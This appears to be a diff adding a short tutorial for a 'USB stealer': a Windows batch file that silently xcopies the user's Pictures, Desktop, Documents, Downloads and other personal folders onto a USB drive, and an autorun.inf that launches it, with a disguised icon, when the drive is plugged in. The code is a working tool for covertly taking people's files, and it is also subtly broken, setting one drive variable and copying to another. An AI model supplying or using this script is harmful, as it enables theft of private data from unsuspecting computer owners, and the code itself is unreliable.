@@ -1,0 +1,30 @@
+step 1 - open new notepad file
+
+Code :
+ :: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
+%backupcmd% "%USERPROFILE%\Download" "%drive%\all\Download"
+%backupcmd% "%USERPROFILE%\Desktop" "%drive%\all\Desktop"
+%backupcmd% "%USERPROFILE%\Music" "%drive%\all\Music"
+%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"
+@echo off 
+
+save as new.bat
+
+step 2 - open new notepad file 
+Code:
+[autorun]
+open=new.bat
+icon=new.bat,0
+
+Save as autorun.inf
+
+step 3 - paste both files in your USB  drive...
+
+-------------------------------------------------------------------------------------------------------------------------
